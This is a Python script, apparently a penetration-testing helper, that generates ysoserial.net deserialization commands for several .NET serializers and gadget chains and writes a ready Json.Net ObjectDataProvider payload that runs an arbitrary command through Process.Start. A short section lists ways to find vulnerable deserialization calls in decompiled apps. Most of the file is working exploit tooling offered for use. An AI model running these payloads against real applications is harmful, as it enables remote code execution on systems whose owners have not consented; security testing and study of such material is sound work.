"""
.NET Deserialization Payload Generator

Attack Vector:
    Desktop applications using BinaryFormatter, SoapFormatter, NetDataContractSerializer,
    LosFormatter, ObjectStateFormatter, or JavaScriptSerializer may be vulnerable
    to deserialization attacks when processing imported files.

Common vulnerable formats:
    - ViewState (.aspx)
    - Binary serialized objects (.bin, .dat)
    - SOAP messages
    - Remoting channels
    - Custom file formats using BinaryFormatter

Tools:
    - ysoserial.net: https://github.com/pwntester/ysoserial.net
    - This script generates command templates for ysoserial.net

Usage:
    python -I dotnet_deser.py --cmd calc.exe --formatter all
    python -I dotnet_deser.py --cmd calc.exe --formatter BinaryFormatter --output payload.bin
"""

import argparse
import base64
import os
import json


FORMATTERS = {
    "BinaryFormatter": {
        "desc": "Most common .NET serializer (deprecated but widely used)",
        "ysoserial_cmd": 'ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "{cmd}" -o raw > payload.bin',
        "gadgets": ["TypeConfuseDelegate", "TextFormattingRunProperties", "WindowsIdentity",
                     "ClaimsPrincipal", "PSObject"],
        "file_ext": ".bin",
    },
    "SoapFormatter": {
        "desc": "SOAP-based .NET serialization",
        "ysoserial_cmd": 'ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -c "{cmd}" -o raw > payload.soap',
        "gadgets": ["TextFormattingRunProperties", "ActivitySurrogateSelector"],
        "file_ext": ".soap",
    },
    "LosFormatter": {
        "desc": "Used in ASP.NET ViewState",
        "ysoserial_cmd": 'ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c "{cmd}" -o base64',
        "gadgets": ["TypeConfuseDelegate", "TextFormattingRunProperties"],
        "file_ext": ".txt",
    },
    "NetDataContractSerializer": {
        "desc": "WCF serializer",
        "ysoserial_cmd": 'ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c "{cmd}" -o raw > payload.xml',
        "gadgets": ["TypeConfuseDelegate", "TextFormattingRunProperties", "PSObject"],
        "file_ext": ".xml",
    },
    "DataContractSerializer": {
        "desc": "WCF default serializer (limited gadgets)",
        "ysoserial_cmd": 'ysoserial.exe -f DataContractSerializer -g XamlAssemblyLoadFromFile -c "{cmd}" -o raw > payload.xml',
        "gadgets": ["XamlAssemblyLoadFromFile"],
        "file_ext": ".xml",
    },
    "XmlSerializer": {
        "desc": "XML-based serialization (limited but still exploitable)",
        "ysoserial_cmd": 'ysoserial.exe -f XmlSerializer -g ObjectDataProvider -c "{cmd}" -o raw > payload.xml',
        "gadgets": ["ObjectDataProvider"],
        "file_ext": ".xml",
    },
    "Json.Net": {
        "desc": "Newtonsoft.Json with TypeNameHandling != None",
        "ysoserial_cmd": 'ysoserial.exe -f Json.Net -g ObjectDataProvider -c "{cmd}" -o raw > payload.json',
        "gadgets": ["ObjectDataProvider"],
        "file_ext": ".json",
    },
}

JSON_NET_PAYLOAD_TEMPLATE = """{
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName": "Start",
    "MethodParameters": {
        "$type": "System.Collections.ArrayList, mscorlib",
        "$values": ["cmd", "/c __CMD__"]
    },
    "ObjectInstance": {
        "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
    }
}"""


def main():
    parser = argparse.ArgumentParser(description=".NET Deserialization payload reference for VAPT")
    parser.add_argument("--cmd", default="calc.exe", help="Command to execute")
    parser.add_argument("--formatter", default="all",
                        choices=list(FORMATTERS.keys()) + ["all"])
    parser.add_argument("--output", "-o", default=".", help="Output directory")
    args = parser.parse_args()

    os.makedirs(args.output, exist_ok=True)

    print("[*] .NET Deserialization Payload Reference")
    print(f"[*] Command: {args.cmd}\n")

    formatters = list(FORMATTERS.keys()) if args.formatter == "all" else [args.formatter]

    # Generate ysoserial command reference
    ref_lines = ["# .NET Deserialization — ysoserial.net Commands", ""]
    ref_lines.append("# Download: https://github.com/pwntester/ysoserial.net/releases")
    ref_lines.append("")

    for name in formatters:
        info = FORMATTERS[name]
        cmd_line = info["ysoserial_cmd"].replace("{cmd}", args.cmd)

        ref_lines.append(f"## {name} — {info['desc']}")
        ref_lines.append(f"# Gadgets: {', '.join(info['gadgets'])}")
        ref_lines.append(cmd_line)
        ref_lines.append("")

        # Generate all gadget variants
        for gadget in info["gadgets"]:
            variant = f'ysoserial.exe -f {name} -g {gadget} -c "{args.cmd}" -o raw > {name}_{gadget}{info["file_ext"]}'
            ref_lines.append(f"# {gadget}:")
            ref_lines.append(variant)
        ref_lines.append("")

    ref_path = os.path.join(args.output, "ysoserial_commands.txt")
    with open(ref_path, "w") as f:
        f.write("\n".join(ref_lines))
    print(f"[+] {ref_path} — ysoserial.net command reference")

    # Generate Json.Net inline payload
    json_payload = JSON_NET_PAYLOAD_TEMPLATE.replace("__CMD__", args.cmd)
    json_path = os.path.join(args.output, "jsonnet_payload.json")
    with open(json_path, "w") as f:
        f.write(json_payload)
    print(f"[+] {json_path} — Json.Net TypeNameHandling payload")

    # Detection tips
    detect_path = os.path.join(args.output, "detection_tips.txt")
    with open(detect_path, "w") as f:
        f.write("""How to Identify .NET Deserialization in Desktop Apps
=====================================================

1. Look for these in decompiled code (dnSpy/ILSpy):
   - BinaryFormatter.Deserialize()
   - SoapFormatter.Deserialize()
   - NetDataContractSerializer.ReadObject()
   - LosFormatter.Deserialize()
   - XmlSerializer (with user-controlled Type)
   - JsonConvert.DeserializeObject() with TypeNameHandling != None
   - JavaScriptSerializer with SimpleTypeResolver

2. Check imported file formats:
   - Binary blobs (.bin, .dat, .cache) → likely BinaryFormatter
   - XML with type annotations → NetDataContractSerializer
   - JSON with "$type" → Json.Net
   - Base64 strings in config → LosFormatter / ViewState

3. Grep patterns (in decompiled source):
   BinaryFormatter
   Deserialize
   TypeNameHandling
   SimpleTypeResolver
   NetDataContractSerializer

4. Tools:
   - dnSpy: Decompile and debug .NET desktop apps
   - ILSpy: .NET assembly browser
   - ysoserial.net: Payload generation
   - GadgetToJScript: Generate JScript/VBScript payloads
""")
    print(f"[+] {detect_path} — Detection and identification tips")


if __name__ == "__main__":
    main()
